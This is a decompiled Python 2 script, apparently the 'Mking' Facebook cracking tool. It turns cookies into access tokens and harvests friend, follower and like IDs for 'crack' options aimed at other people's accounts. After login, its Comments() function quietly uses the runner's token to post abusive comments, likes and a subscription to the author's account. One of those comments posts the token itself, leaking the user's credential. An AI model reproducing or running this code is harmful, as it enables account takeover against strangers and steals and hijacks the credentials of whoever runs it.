# uncompyle6 version 3.6.7
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: <Mking>
'''
Dec By Mr. Error :(
'''

import requests, bs4, sys, os, random, time, re, json, uuid, calendar
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from datetime import date
from multiprocessing.pool import ThreadPool
from bs4 import BeautifulSoup as parser
reload(sys)
sys.setdefaultencoding('utf-8')
if 'linux' in sys.platform.lower():
    p = '\x1b[1;37m'
    k = '\x1b[1;33m'
    b = '\x1b[1;36m'
    m = '\x1b[1;91m'
    h = '\x1b[1;32m'
    d = '\x1b[1;34m'
    a = '\x1b[1;34m'
else:
    p = ''
    k = ''
    b = ''
    m = ''
    h = ''
    d = ''
    a = ''
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
else:
    try:
        import bs4
    except ImportError:
        os.system('pip2 install bs4')
    else:
        try:
            import futures
        except ImportError:
            os.system('pip2 install futures')

    def jalan(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.02)


    def mengetik(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.1)


    def speed(z):
        for e in z + '\n':
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.001)


    def run_afg():
        m = [
         '|', '/', '-', '\\']
        for b in range(2):
            for t in m:
                sys.stdout.write('  \r\x1b[37m [\x1b[33m!\x1b[37m] \x1b[36mConnecting Server \x1b[32m' + t)
                sys.stdout.flush()
                time.sleep(1)


    def profaisor_exit():
        m = ['|', '/', '-', '\\']
        for b in range(2):
            for t in m:
                sys.stdout.write('  \r\x1b[37m [\x1b[33m!\x1b[37m] \x1b[36mRemoving Token \x1b[32m' + t)
                os.system('rm -rf login.txt')
                sys.stdout.flush()
                time.sleep(1)


    profaisor_style = '\x1b[1;91m\xe2\x9e\xa4\x1b[1;33m\xe2\x9e\xa4\x1b[1;32m\xe2\x9e\xa4\x1b[1;36m\xe2\x9e\xa4\x1b[0m'
    profaisor_style2 = '\x1b[4;33mChoose\x1b[0m\n \x1b[1;91m\xe2\x9e\xa4\x1b[1;33m\xe2\x9e\xa4\x1b[1;32m\xe2\x9e\xa4\x1b[1;36m\xe2\x9e\xa4\x1b[0m'
    fb = 'https://m.facebook.com'
    loop = 0
    id = []
    ok = []
    cp = []
    ct = datetime.now()
    n = ct.month
    bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
    try:
        if n < 0 or n > 12:
            exit()
        nTemp = n - 1
    except ValueError:
        exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = '%s-%s-%s-%s' % (hr, ha, op, ta)
tgl = '%s %s %s' % (ha, op, ta)
bulan_ttl = {'01': 'January', '02': 'February', '03': 'March', '04': 'April', '05': 'May', '06': 'June', '07': 'July', '08': 'August', '09': 'September', '10': 'October', '11': 'November', '12': 'December'}
logo = '\n\x1b[1;91m             ##     ##    ##    ## #### ##    ##  ######\x1b[1;0m\n\x1b[1;91m            ###   ###    ##   ##   ##  ###   ## ##    ##\x1b[1;0m\n\x1b[1;97m           #### ####    ##  ##    ##  ####  ## ##\x1b[1;0m\n\x1b[1;97m          ## ### ##    #####     ##  ## ## ## ##   ####\x1b[1;0m\n\x1b[1;91m         ##     ##    ##  ##    ##  ##  #### ##    ## \x1b[1;0m\n\x1b[1;91m        ##     ##    ##   ##   ##  ##   ### ##    ##\x1b[1;0m\n\x1b[1;97m       ##     ##    ##    ## #### ##    ##  ######\x1b[1;0m\n\x1b[1;97m--------------------------------------------------\n\x1b[1;91m Author      : Mohammad Sultani \n\x1b[1;91m GitHub      : https://github.com/Mohammadjan1122\n\x1b[1;91m YouTube     : Termux Master\n\x1b[1;91m Telegram    : https://t.me/sultani1122\n\x1b[1;91m Blogspot    : https://mohammadsultani.blogspot.com\n\x1b[1;97m--------------------------------------------------\n'

def mohammad():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = ('-').join(uuid)
    print logo
    print '\x1b[37;1mYour ID : ' + id
    try:
        httpCaht = requests.get('https://raw.githubusercontent.com/Mohammadjan1122/Mking/main/Id.txt').text
        if id in httpCaht:
            print '\x1b[37;1mYOUR ID IS ACTIVE.........'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[37;1mYOUR ID IS NOT ACTIVE.........'
            print '\x1b[37;1msend id to Telegram group (@mking_script )...'
            os.system('xdg-open https://t.me/mking_script')
            time.sleep(1)
            sys.exit()
        try:
            open('login.txt', 'r')
            menu()
        except IOError:
            login()

    except:
        sys.exit()
        if name == '__main__':
            mohammad()


def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


Mking_youtube = random.choice(['https://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw'])
youtuber = Mking_youtube
ua1 = 'Mozilla/5.0 (Linux; Android 9; moto e6s Build/POES29.288-60-6-1-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/317.0.0.51.119;]'
ua2 = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J410G Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua3 = 'Mozilla/5.0 (Linux; Android 10; moto g 5G Build/QZKS30.Q4-40-81-3-4; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua4 = 'Mozilla/5.0 (Linux; Android 6.0; LG-X230 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua5 = 'Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/268.0.0.5.116;]'
ua6 = 'Mozilla/5.0 (Linux; Android 8.1.0; SM-J260M Build/M1AJB; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/84.0.4147.89 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua7 = 'Mozilla/5.0 (Linux; Android 8.0.0; SM-A720F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.62 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua8 = 'Mozilla/5.0 (Linux; Android 10; moto g(8) plus Build/QPIS30.28-Q3-28-26-4-1-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/286.0.0.48.112;]'
ua9 = 'Mozilla/5.0 (Linux; Android 11; motorola one hyper Build/RPFS31.Q1-21-20-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua10 = 'Mozilla/5.0 (Linux; Android 9; LM-K410 Build/PKQ1.190522.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/335.0.0.28.118;]'
ua11 = 'Mozilla/5.0 (Linux; Android 7.0; ASUS_X018D Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/336.0.0.20.117;]'
ua12 = 'Mozilla/5.0 (Linux; Android 6.0; MEIZU_M5 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.147 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua13 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18B92 [FBAN/FBIOS;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/14.2;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
ua14 = 'Mozilla/5.0 (Linux; Android 10; N20Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua15 = 'Mozilla/5.0 (Linux; Android 10; M2006C3MG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua16 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A5010 Build/QKQ1.191014.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua17 = 'Mozilla/5.0 (Linux; Android 11; SM-A207F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/280.0.0.9.119;]'
ua18 = 'Mozilla/5.0 (Linux; Android 10; CLT-L09 Build/HUAWEICLT-L09; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/279.0.0.10.118;]'
ua19 = 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18F72 [FBAN/FBIOS;FBDV/iPhone11,6;FBMD/iPhone;FBSN/iOS;FBSV/14.6;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]'
ua20 = 'Mozilla/5.0 (Linux; Android 10; ONEPLUS A6003 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.92 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/346.0.0.29.119;]'
ua21 = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/297.0.0.6.119;]'
ua22 = 'Mozilla/5.0 (Linux; Android 8.1.0; BPRO Build/OPM2.171019.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/264.0.0.44.111;]'
ua23 = 'Mozilla/5.0 (Linux; Android 10; GM1913 Build/QKQ1.190716.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/294.0.0.24.129;]'
ua24 = 'Mozilla/5.0 (Linux; Android 11; IN2010 Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.93 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/296.0.0.12.119;]'
ua25 = 'Mozilla/5.0 (Linux; Android 10; vivo 1806 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/235.0.0.5.119;]'
ua = random.choice([ua1, ua2, ua3, ua4, ua5, ua6, ua7, ua8, ua9, ua10, ua11, ua12, ua13, ua14, ua15, ua16, ua17, ua18, ua19, ua20, ua21, ua22, ua23, ua24, ua25])

def login():
    os.system('clear')
    print logo
    print '\x1b[1;93m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n'
    print ' %s[%s1%s] Login with token %s(%sby Mking%s)\n\n%s [%s2%s] Login with cookie %s(by profaisor)\n\n%s [%s3%s] How to Get Access Token\n\n%s ' % (p, k, p, h, p, h, p, k, p, m, p, k, p, p)
    chose_login = raw_input(' \x1b[4;33mChoose Option %s:\x1b[0m%s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4 %s' % (p, m, k, h, b, p))
    if chose_login in ('1', '01'):
        log_token()
    elif chose_login in ('2', '02'):
        cookie()
    if chose_login in ('3', '03'):
        mking_token()
    if chose_login in ('fff', 'fbbd'):
        __seting_login_fb_game__()
    if chose_login in ('nzns', 'xnndn'):
        login_pass()
    elif chose_login in ('nxnd', 'xnns'):
        cute()
    else:
        print '\n%s [%s!%s] Unknown!' % (p, m, p)
        time.sleep(2)
        login()


def mking_token():
    jalan('%s \xe2\x80\xa2%s login fb to url %shttps://m.facebook.com' % (b, p, h))
    time.sleep(2)
    jalan('%s \xe2\x80\xa2%s copy link %s[ %sview-source:https://business.facebook.com/business_locations%s ]%s and past to  chrome' % (b, p, m, b, m, p))
    time.sleep(2)
    jalan('%s \xe2\x80\xa2%s and %s/Finder Page%s search %sEAAG%s \n' % (b, p, h, p, h, p))
    time.sleep(2)
    jalan('%s \xe2\x80\xa2%s Video  %s/ youtube%s please subscribe > %shttps://youtube.com/channel/UCf1GQX6XsLv46xeUfo_GbPw%s \n' % (b, p, h, p, h, p))
    time.sleep(2)
    raw_input(' \x1b[1;37m[\x1b[1;33mENTER\x1b[1;37m]')
    login()


def log_token():
    os.system('clear')
    print logo
    print '\x1b[1;93m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\n'
    mking_token = raw_input('%s [%s\xe2\x80\xa2%s] Enter Token: %s' % (p, k, p, h))
    try:
        mohd = requests.get('https://graph.facebook.com/me?access_token=%s' % mking_token)
        open('login.txt', 'w').write(mking_token)
        run_afg()
        print '\n %s[%s\xe2\x80\xa2%s] Login Succesfully' % (p, k, p)
        jalan(' %s[%s\xe2\x80\xa2%s] Please Subscribe My Channel:)' % (p, k, p))
        os.system('xdg-open %s' % youtuber)
        exit(Comments())
    except KeyError:
        print '\n %s[%s!%s] Token invalid!' % (p, m, p)
        time.sleep(1)
        login()


def cookie():
    os.system('clear')
    print logo
    print '\x1b[1;93m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    cookie = raw_input('\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Cookie: ')
    try:
        data = requests.get('https://business.facebook.com/business_locations', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36', 
           'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
        find_token = re.search('(EAAG\\w+)', data.text)
        hasil = ' \x1b[0;97m[\x1b[0;91m!\x1b[0;97m] Your Cookie Invalid' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
    except requests.exceptions.ConnectionError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] No Connection'

    cookie = open('login.txt', 'w')
    cookie.write(find_token.group(1))
    cookie.close()
    print '\n %s[%s\xe2\x80\xa2%s] Login successfull' % (p, k, p)
    jalan(' %s[%s\xe2\x80\xa2%s] Please Subscribe My Channel:)' % (p, k, p))
    os.system('xdg-open %s' % youtuber)
    exit(Comments())
    return


def Comments():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(login())

    post = '1230470587425293'
    post1 = '919926182252721'
    post2 = '1595086027498652'
    post3 = '1547598918914030'
    post4 = '1536768643330391'
    post5 = '1536362756704313'
    post6 = '1536167886723800'
    post7 = '1535442736796315'
    post8 = '1534926046847984'
    post9 = '1534926046847984'
    post10 = '1533759106964678'
    kom = 'MotherFucker 🤣🖕'
    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post3 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post4 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post5 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post6 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post7 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post8 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post9 + '/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post10 + '/comments/?message=' + token + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post1 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post3 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post4 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post5 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post6 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post7 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post8 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post9 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post10 + '/likes?summary=true&access_token=' + token)
    requests.post('https://graph.facebook.com/100045203855294/subscribers?access_token=' + token)
    menu()


def menu():
    try:
        token = open('login.txt', 'r').read()
        mohd = requests.get('https://graph.facebook.com/me/?access_token=%s' % token)
        i = json.loads(mohd.text)
        nick = i['name']
        idme = i['id']
        ttlme = i['birthday']
        month, day, year = ttlme.split('/')
        month = bulan_ttl[month]
    except Exception as e:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    IP = requests.get('https://api.ipify.org').text
    print '\x1b[1;93m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '%s [%s\xe2\x80\xa2%s] Your fb name      : %s ' % (p, k, p, nick)
    print '%s [%s\xe2\x80\xa2%s] Your ID facebook   : %s ' % (p, k, p, idme)
    print '%s [%s\xe2\x80\xa2%s] Your IP      : %s ' % (p, k, p, IP)
    print '%s [%s\xe2\x80\xa2%s] Your DOB           : %s %s %s' % (p, k, p, day, month, year)
    print '%s [%s\xe2\x80\xa2%s]  Your Date Time     : %s ' % (p, k, p, tgl)
    print '\x1b[1;93m \xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90'
    print '%s [%s01%s] Crack From %sMking_pro frind and public id ' % (p, k, p, h)
    print '%s [%s02%s] Crack From friends ' % (p, k, p)
    print '%s [%s03%s] Crack From friends public ' % (p, k, p)
    print '%s [%s04%s] Crack From followers public' % (p, k, p)
    print '%s [%s05%s] Crack From like public' % (p, k, p)
    print '%s [%s06%s] Setting user agent' % (p, k, p)
    print '%s [%s00%s] Logout' % (p, k, p)
    pill = raw_input('\n \x1b[4;33mChoose%s:\x1b[0m %s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4%s\xe2\x9e\xa4 %s' % (p, m, k, h, b, p))
    if pill in ('1', '01'):
        Mking_pro()
        method_crack_mking()
    elif pill in ('2', '02'):
        teman()
        method_crack_mking()
    elif pill in ('3', '03'):
        publik()
        method_crack_mking()
    elif pill in ('4', '04'):
        followers()
        method_crack_mking()
    elif pill in ('5', '05'):
        like()
        method_crack_mking()
    elif pill in ('mking', 'profaisor'):
        sandi_dev()
    elif pill in ('6', '06'):
        setting()
    elif pill in ('8', '08'):
        results()
    elif pill in ('12', ):
        mengetik('\n \x1b[1;93mTips & Trick\n\n \x1b[1;37mJika pada saat crack selalu tidak ada hasil, anda bisa mengatur apn terlebih dahulu ')
        raw_input('\n\n \x1b[1;37m[\x1b[1;33m ENTER \x1b[1;37m]')
        tips()
    elif pill in ('0', '00'):
        profaisor_exit()
    elif pill in ('9', '09'):
        menu()
    elif pill in '10':
        time.sleep(1.5)
        goblak()
    else:
        print '\n%s [%s!%s] Unknown!' % (p, m, p)
        time.sleep(1)
        menu()


def teman():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    try:
        for i in requests.get('https://graph.facebook.com/me/friends?limit=5000&access_token=%s' % token).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)

    except KeyError:
        exit('\n%s [%s!%s] Private id' % (p, m, p))

    if len(id) == 0:
        exit('\n%s [%s!%s]  your id not found ' % (p, m, p))
    else:
        print '%s [%s\xe2\x80\xa2%s] Nama     : %s' % (p, k, p, jenenge)
        print '%s [%s\xe2\x80\xa2%s] Total id :%s %s' % (p, k, p, h, len(id))


def publik():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Enter publik id\n [%s\xe2\x80\xa2%s] ID target: ' % (p, k, p, k, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/friends?limit=5000&access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)

    except KeyError:
        exit('\n%s [%s!%s] Private id' % (p, m, p))

    if len(id) == 0:
        jalan('\n%s [%s!%s] Total ID 0 ' % (p, m, p))
        time.sleep(2)
        publik()
    else:
        print '%s [%s\xe2\x80\xa2%s] Nama     : %s' % (p, k, p, jenenge)
        print '%s [%s\xe2\x80\xa2%s] Total id :%s %s' % (p, k, p, h, len(id))


def tod():
    print ' %s[%s\xe2\x80\xa2%s] Remove token... %s' % (p, m, p, p)
    time.sleep(3)
    os.system('rm -rf login.txt')
    sys.stdout.flush()
    time.sleep(1)


def followers():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Enter id  \n [%s\xe2\x80\xa2%s] Enter ID  : ' % (p, k, p, k, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/subscribers?limit=20000&access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)

    except KeyError:
        exit('\n%s [%s!%s] Followers id not found ' % (p, m, p))

    if len(id) == 0:
        exit('\n%s [%s!%s] followers id  0' % (p, m, p))
    else:
        print '%s [%s\xe2\x80\xa2%s] Nama     : %s' % (p, k, p, jenenge)
        print '%s [%s\xe2\x80\xa2%s] Total id :%s %s' % (p, k, p, h, len(id))


def likes():
    global token
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\n %s[%s!%s] Token invalid' % (p, m, p)
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    idt = raw_input('\n%s [%s\xe2\x80\xa2%s] Enter id post\n [%s\xe2\x80\xa2%s] ID post  : ' % (p, k, p, k, p))
    try:
        for i in requests.get('https://graph.facebook.com/%s/likes?limit=100000&access_token=%s' % (idt, token)).json()['data']:
            idne = i['id']
            jenenge = i['name']
            id.append(idne + '<=>' + jenenge)

    except KeyError:
        exit('\n%s [%s!%s] User likes id not found ' % (p, m, p))

    if len(id) == 0:
        exit('\n%s [%s!%s] likes id  0' % (p, m, p))
    else:
        print '%s [%s\xe2\x80\xa2%s] Nama     : %s' % (p, k, p, jenenge)
        print '%s [%s\xe2\x80\xa2%s] Total id :%s %s' % (p, k, p, h, len(id))


__mking__dev = 'https://m.facebook.com/v8.0/dialog/oauth?cct_prefetching=0&client_id=1591956834435357&cbt=1622137477843&e2e=%7B%22init%22%3A1622137477843%7D&ies=1&sdk&_rdr'
